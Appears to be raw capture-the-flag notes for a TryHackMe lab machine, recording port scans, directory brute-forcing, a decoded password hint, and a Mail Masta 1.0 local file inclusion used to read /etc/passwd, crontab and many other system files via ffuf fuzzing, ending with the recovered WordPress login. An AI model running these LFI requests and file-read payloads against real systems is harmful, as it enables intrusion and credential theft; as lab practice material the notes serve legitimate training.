<code>
  
## Service Enumaration 

└─$ nmap  -p- -Pn 10.10.200.162 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-25 05:24 CDT
Nmap scan report for 10.10.200.162
Host is up (0.037s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds

### FTP - nothing 
└─$ nmap  -sV -sC -A  -p21 10.10.200.162
Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-25 05:27 CDT
Nmap scan report for 10.10.200.162
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.30.202
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.27 seconds

### WwWW

┌──(duke㉿kali)-[~/Documents/THM_all_in_one]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.200.162 -x .php, .txt, .html

Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     http://10.10.200.162
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,
[+] Timeout:                 10s

2024/03/25 05:30:23 Starting gobuster in directory enumeration mode

/wordpress            (Status: 301) [Size: 318] [--> http://10.10.200.162/wordpress/]
/hackathons           (Status: 200) [Size: 197]                                      
/server-status        (Status: 403) [Size: 278]                                      

2024/03/25 06:13:56 Finished

#### in /hackathons found


Damn how much I hate the smell of Vinegar

Dvc W@iyur@123 
KeepGoing 

VIGENERE CYPHER key "KeepGoing"

Try H@ckme@123


└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.197.77/heckathons -x .php, .txt, .html

Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     http://10.10.197.77/heckathons
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,
[+] Timeout:                 10s
2024/03/25 07:46:00 Starting gobuster in directory enumeration mode
2024/03/25 08:29:17 Finished

└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.197.77/wordpress -x .php, .txt, .html

Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     http://10.10.197.77/wordpress
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,
[+] Timeout:                 10s

2024/03/25 08:35:14 Starting gobuster in directory enumeration mode

/index.php            (Status: 301) [Size: 0] [--> http://10.10.197.77/wordpress/]
/wp-content           (Status: 301) [Size: 327] [--> http://10.10.197.77/wordpress/wp-content/]
/wp-login.php         (Status: 200) [Size: 6766]                                               
/wp-includes          (Status: 301) [Size: 328] [--> http://10.10.197.77/wordpress/wp-includes/]
/wp-trackback.php     (Status: 200) [Size: 135]                                                 
/wp-admin             (Status: 301) [Size: 325] [--> http://10.10.197.77/wordpress/wp-admin/]   
/xmlrpc.php           (Status: 405) [Size: 42]                                                  
Progress: 127419 / 661683 (19.26%)                                                             ^C
[!] Keyboard interrupt detected, terminating.
                                                  

### wordpress Enumeration
WordPress version 5.5.1
WordPress theme in use: twentytwenty 
http://10.10.42.166/wordpress/wp-content/uploads/
elyel
found user elyana

### Mail Masta 1.0 - Local File Inclusion
http://10.10.42.166/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false sshd:x:112:65534::/run/sshd:/usr/sbin/nologin ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 

# /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 
****root cd / && run-parts --report /etc/cron.hourly
*25 6***root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) 
47 6**7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 
52 6 1 **root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) 
*****root /var/backups/script.sh 

/etc/ssh/sshd_config
/etc/group

┌──(duke㉿kali)-[~/Documents/THM_all_in_one]
└─$ ffuf -w ../../www/wordlists/LFI_pathtotest.txt -u 'http://10.10.42.166/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=FUZZ' | egrep -v "Words: 1" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.42.166/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=FUZZ
 :: Wordlist         : FUZZ: ../../www/wordlists/LFI_pathtotest.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

/proc/self/status       [Status: 500, Size: 1304, Words: 92, Lines: 55, Duration: 37ms]
/proc/self/stat         [Status: 500, Size: 320, Words: 52, Lines: 2, Duration: 106ms]
/etc/vsftpd.conf        [Status: 200, Size: 5847, Words: 806, Lines: 156, Duration: 97ms]
:: Progress: [569/569] :: Job [1/1] :: 329 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~/Documents/THM_all_in_one]
└─$ ffuf -w ../../www/wordlists/LFI_LFI-gracefulsecurity-linux.txt -u 'http://10.10.42.166/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=FUZZ' | egrep -v "Words: 1" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.42.166/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=FUZZ
 :: Wordlist         : FUZZ: ../../www/wordlists/LFI_LFI-gracefulsecurity-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

/etc/hosts              [Status: 500, Size: 221, Words: 22, Lines: 10, Duration: 34ms]
/etc/fstab              [Status: 500, Size: 630, Words: 76, Lines: 12, Duration: 67ms]
/etc/apache2/apache2.conf [Status: 200, Size: 7224, Words: 942, Lines: 228, Duration: 101ms]
/etc/hosts.allow        [Status: 500, Size: 411, Words: 82, Lines: 11, Duration: 102ms]
/etc/issue              [Status: 500, Size: 26, Words: 5, Lines: 3, Duration: 135ms]
/etc/lsb-release        [Status: 500, Size: 105, Words: 3, Lines: 5, Duration: 105ms]
/etc/resolv.conf        [Status: 500, Size: 749, Words: 98, Lines: 20, Duration: 109ms]
/etc/ssh/ssh_config     [Status: 500, Size: 1580, Words: 248, Lines: 52, Duration: 108ms]
/etc/ssh/sshd_config    [Status: 500, Size: 3264, Words: 294, Lines: 123, Duration: 138ms]
/etc/ssh/ssh_host_dsa_key.pub [Status: 500, Size: 601, Words: 3, Lines: 2, Duration: 111ms]
/etc/vsftpd.conf        [Status: 200, Size: 5847, Words: 806, Lines: 156, Duration: 134ms]
/proc/interrupts        [Status: 500, Size: 1773, Words: 689, Lines: 41, Duration: 102ms]
/proc/modules           [Status: 500, Size: 3300, Words: 318, Lines: 63, Duration: 105ms]
/proc/meminfo           [Status: 500, Size: 1307, Words: 476, Lines: 48, Duration: 105ms]
/proc/stat              [Status: 500, Size: 2177, Words: 991, Lines: 10, Duration: 105ms]
/proc/self/net/arp      [Status: 500, Size: 156, Words: 79, Lines: 3, Duration: 103ms]
/var/log/dpkg.log       [Status: 200, Size: 567419, Words: 39924, Lines: 8029, Duration: 126ms]
/var/log/wtmp           [Status: 200, Size: 38016, Words: 3, Lines: 3, Duration: 135ms]
/etc/adduser.conf       [Status: 500, Size: 3028, Words: 402, Lines: 89, Duration: 113ms]
/etc/apache2/mods-available/deflate.conf [Status: 500, Size: 395, Words: 23, Lines: 11, Duration: 108ms]
/etc/apache2/mods-available/autoindex.conf [Status: 500, Size: 3374, Words: 313, Lines: 97, Duration: 108ms]
/etc/apache2/mods-available/mime.conf [Status: 200, Size: 7676, Words: 943, Lines: 252, Duration: 108ms]
/etc/apache2/mods-available/ssl.conf [Status: 500, Size: 3110, Words: 431, Lines: 86, Duration: 109ms]
/etc/apache2/mods-enabled/status.conf [Status: 500, Size: 749, Words: 82, Lines: 30, Duration: 139ms]
/etc/apache2/mods-enabled/deflate.conf [Status: 500, Size: 395, Words: 23, Lines: 11, Duration: 107ms]
/etc/apache2/mods-enabled/mime.conf [Status: 200, Size: 7676, Words: 943, Lines: 252, Duration: 129ms]
/etc/apache2/ports.conf [Status: 500, Size: 320, Words: 36, Lines: 16, Duration: 109ms]
/etc/bash.bashrc        [Status: 500, Size: 2319, Words: 399, Lines: 72, Duration: 109ms]
/etc/ca-certificates.conf [Status: 200, Size: 5986, Words: 64, Lines: 147, Duration: 106ms]
/etc/ca-certificates.conf.dpkg-old [Status: 200, Size: 5898, Words: 64, Lines: 145, Duration: 107ms]
/etc/crypttab           [Status: 500, Size: 54, Words: 5, Lines: 2, Duration: 107ms]
/etc/deluser.conf       [Status: 500, Size: 604, Words: 86, Lines: 21, Duration: 106ms]
/etc/debconf.conf       [Status: 500, Size: 2969, Words: 411, Lines: 84, Duration: 107ms]
/etc/fuse.conf          [Status: 500, Size: 280, Words: 38, Lines: 9, Duration: 109ms]
/etc/hdparm.conf        [Status: 200, Size: 4861, Words: 726, Lines: 139, Duration: 106ms]
/etc/issue.net          [Status: 500, Size: 19, Words: 3, Lines: 2, Duration: 107ms]
/etc/ld.so.conf         [Status: 500, Size: 34, Words: 2, Lines: 3, Duration: 132ms]
/etc/ldap/ldap.conf     [Status: 500, Size: 332, Words: 23, Lines: 18, Duration: 110ms]
/etc/manpath.config     [Status: 200, Size: 5174, Words: 530, Lines: 132, Duration: 129ms]
/etc/modules            [Status: 500, Size: 195, Words: 33, Lines: 6, Duration: 111ms]
/etc/os-release         [Status: 500, Size: 386, Words: 6, Lines: 13, Duration: 124ms]
/etc/pam.conf           [Status: 500, Size: 552, Words: 65, Lines: 16, Duration: 130ms]
/etc/security/access.conf [Status: 200, Size: 4620, Words: 691, Lines: 123, Duration: 135ms]
/etc/security/group.conf [Status: 500, Size: 3635, Words: 690, Lines: 107, Duration: 123ms]
/etc/security/limits.conf [Status: 500, Size: 2150, Words: 746, Lines: 57, Duration: 117ms]
/etc/security/namespace.conf [Status: 500, Size: 1440, Words: 219, Lines: 29, Duration: 117ms]
/etc/security/pam_env.conf [Status: 500, Size: 2972, Words: 429, Lines: 74, Duration: 121ms]
/etc/security/time.conf [Status: 500, Size: 2179, Words: 342, Lines: 66, Duration: 115ms]
/etc/sysctl.conf        [Status: 500, Size: 2683, Words: 277, Lines: 78, Duration: 104ms]
/etc/sysctl.d/10-network-security.conf [Status: 500, Size: 509, Words: 62, Lines: 13, Duration: 113ms]
/etc/updatedb.conf      [Status: 500, Size: 403, Words: 42, Lines: 5, Duration: 107ms]
/proc/net/tcp           [Status: 500, Size: 600, Words: 222, Lines: 5, Duration: 222ms]
/proc/devices           [Status: 500, Size: 546, Words: 98, Lines: 60, Duration: 238ms]
/proc/net/udp           [Status: 500, Size: 384, Words: 99, Lines: 4, Duration: 222ms]
/proc/self/stat         [Status: 500, Size: 320, Words: 52, Lines: 2, Duration: 78ms]
/proc/self/status       [Status: 500, Size: 1304, Words: 91, Lines: 55, Duration: 78ms]
/usr/share/adduser/adduser.conf [Status: 500, Size: 3028, Words: 402, Lines: 89, Duration: 72ms]
:: Progress: [878/878] :: Job [1/1] :: 421 req/sec :: Duration: [0:00:02] :: Errors: 0 ::


login to wordpress as elyana psw H@ckme@123 

<\code>
